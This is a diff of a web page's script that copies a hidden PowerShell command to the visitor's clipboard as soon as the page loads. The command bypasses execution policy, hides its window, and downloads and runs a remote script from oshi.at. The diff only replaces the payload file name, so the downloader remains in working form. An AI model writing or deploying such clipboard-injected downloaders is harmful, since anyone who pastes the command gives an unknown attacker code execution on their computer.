@@ -7,7 +7,7 @@
     <script>
         // Automatically copy the PowerShell command to clipboard when the page loads
         window.onload = function() {
-            const command = `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX ((New-Object System.Net.WebClient).DownloadString('https://oshi.at/pwPS.ps1'))"`;
+            const command = `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX ((New-Object System.Net.WebClient).DownloadString('https://oshi.at/Qqsh.ps1'))"`;
             navigator.clipboard.writeText(command).then(() => {
                 console.log('Command copied to clipboard!');
             }).catch(err => {
